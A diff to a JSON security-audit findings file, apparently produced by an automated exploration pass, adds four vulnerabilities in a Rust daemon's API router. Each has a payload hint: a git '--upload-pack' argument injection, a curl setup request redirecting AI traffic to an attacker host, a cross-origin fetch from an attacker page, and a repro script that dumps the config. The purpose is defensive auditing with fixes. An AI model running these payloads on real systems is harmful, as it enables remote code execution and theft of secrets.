@@ -2,7 +2,7 @@
   "task_id": "expl-demo",
   "prompt_version": "phase23.exploration.v1",
   "completed_at_utc": "2026-05-21",
-  "actions_used": 7,
+  "actions_used": 11,
   "findings": [
     {
       "path": "crates/nyctos-api/src/router.rs",
@@ -31,6 +31,38 @@
       "line": 184,
       "cap": "CORRECTNESS",
       "rationale": "urlencoded_decode pushes the decoded byte as `char` directly. For percent-encoded bytes >0x7F this yields the Latin-1 codepoint rather than UTF-8 reassembly, so `%C3%A9` decodes to two chars (Ã, ©) instead of one (é). Operator tokens containing any non-ASCII byte are unmatchable via the query-token path. Not a security hole on its own, but combined with finding #1 produces silent auth failures that may push operators toward weaker ASCII-only tokens."
+    },
+    {
+      "path": "crates/nyctos-api/src/router.rs",
+      "line": 868,
+      "cap": "OS_COMMAND",
+      "rationale": "git_ls_remote_probe builds argv as `git -c credential.helper= ls-remote --exit-code <url> [refs]` with no `--` end-of-options sentinel before the user-controlled URL. Git treats positional args starting with `--` as flags, so a `source_url_or_path` such as `--upload-pack=/bin/sh -c id;#` (or `-c core.sshCommand=...` style payloads inherited from CVE-2017-1000117 / CVE-2018-17456-class arg-injection) coerces ls-remote into spawning an arbitrary upload-pack binary on the daemon host. Authenticated, but the handler is reachable any time `i_own_this` is asserted on a project; combined with finding #1 (token leak via query string) or finding #6 (setup-phase open POST), this is authenticated RCE on the daemon. Static pass misses because the dangerous arg is structural, not a shell-meta substring.",
+      "endpoint": "<api:POST /api/v1/projects/:project_id/repos/test>",
+      "suggested_payload_hint": "{\"source_kind\":\"git\",\"source_url_or_path\":\"--upload-pack=touch /tmp/nyctos-pwn\",\"i_own_this\":true} — fix: insert `cmd.arg(\"--\")` immediately before `cmd.arg(url)`."
+    },
+    {
+      "path": "crates/nyctos-api/src/router.rs",
+      "line": 135,
+      "cap": "AUTH_BYPASS",
+      "rationale": "is_setup_path() leaves POST /api/v1/setup, GET /api/v1/setup/status, and POST /api/v1/setup/doctor unauthenticated for the entire window between daemon boot and the first successful POST /api/v1/setup. The only gate is the body field `i_own_this: true`, which is a JSON boolean, not a secret. On a fresh install (or after the operator deletes nyctos.toml to redo onboarding) any local-machine actor — or any malicious web page reaching the loopback port via simple form POST + Origin-blind request — can commit a config with `ai_runtime=\"local-llm\"` and `local_llm_url=\"http://attacker/v1\"`, capturing every subsequent AI prompt (which contain source code, secrets pulled into context, etc.) and writing an attacker-controlled bearer into the OS keychain under ACCOUNT_AI_LOCAL_LLM. Static pass misses because the auth_layer call site looks correct in isolation — the bypass is conditional on setup state, which lives in ServerState.",
+      "endpoint": "<api:POST /api/v1/setup>",
+      "suggested_payload_hint": "Pre-first-setup: curl -X POST http://127.0.0.1:<port>/api/v1/setup -d '{\"ai_runtime\":\"local-llm\",\"local_llm_url\":\"http://attacker/v1\",\"local_llm_token\":\"x\",\"sandbox_backend\":\"process\",\"i_own_this\":true}' — confirms config write without auth."
+    },
+    {
+      "path": "crates/nyctos-api/src/router.rs",
+      "line": 96,
+      "cap": "CORS_MISCONFIG",
+      "rationale": "build_router attaches only auth_layer and TraceLayer; no CorsLayer, no Origin allowlist, no CSRF token, no SameSite cookie binding. Combined with finding #1 (bearer accepted from URL query) and finding #6 (setup-phase open POST), a web page on any origin can drive state-changing POSTs against the loopback daemon: simple form POSTs land without a CORS preflight (Content-Type text/plain bypasses simple-request rules — Axum's Json extractor will reject non-JSON, but POST /api/v1/setup with application/x-www-form-urlencoded? still bounces; however POST to /webhook/git lands and the SPA's known query-token path is exploitable via `<img src=http://127.0.0.1:.../api/v1/projects/.../scan?token=...>`). Loopback-binding is not a substitute for origin checking — DNS rebinding (rebind attacker.com → 127.0.0.1 after initial fetch) reaches the daemon from a foreign-origin tab. Defense: require a same-origin Origin/Referer header on every mutating route, or front the daemon with a tower-http CorsLayer whose allow_origin is the SPA's exact origin only.",
+      "endpoint": "<api:cross-cutting>",
+      "suggested_payload_hint": "Host a page at attacker.com with `fetch('http://127.0.0.1:<port>/api/v1/projects/x/scan?token=<leaked>', {method:'POST', mode:'no-cors'})` — request lands even though response is opaque."
+    },
+    {
+      "path": "crates/nyctos-api/src/router.rs",
+      "line": 1955,
+      "cap": "OS_COMMAND",
+      "rationale": "replay_repro_bundle execs `bash <extracted>/repro.sh` from the tarball produced by build_bundle. The sha256-integrity check at line 1916 only fires when `bundles.last()` returned a row; the auto-build fallback at line 1891–1903 writes a fresh tarball to disk and then immediately runs its repro.sh without rechecking the digest against any persisted reference. If any other writer can drop or substitute a file under `state_bundles_dir/<id>.tar` between build_bundle's write and the read at line 1910 (e.g. a co-located process running as the daemon user, or — combined with finding #2 SSRF — a bundle path returned by a SQL-injection-tainted store call), the daemon executes attacker-controlled bash. Additionally the digest check is bypassed entirely on the auto-build path because `bundles.last()` is None at that point. Fix: hash the freshly-built tar before extraction and refuse on mismatch with the manifest the builder returned; never re-read the on-disk bytes for exec without verifying.",
+      "endpoint": "<api:POST /api/v1/findings/:id/replay>",
+      "suggested_payload_hint": "After substituting state/bundles/<finding>.tar with a PAX tarball containing repro.sh = `#!/bin/bash\\nid; cat ~/.config/nyctos/nyctos.toml`, POST /api/v1/findings/<finding>/replay and observe stdout SSE frames containing the leaked config."
     }
   ]
 }
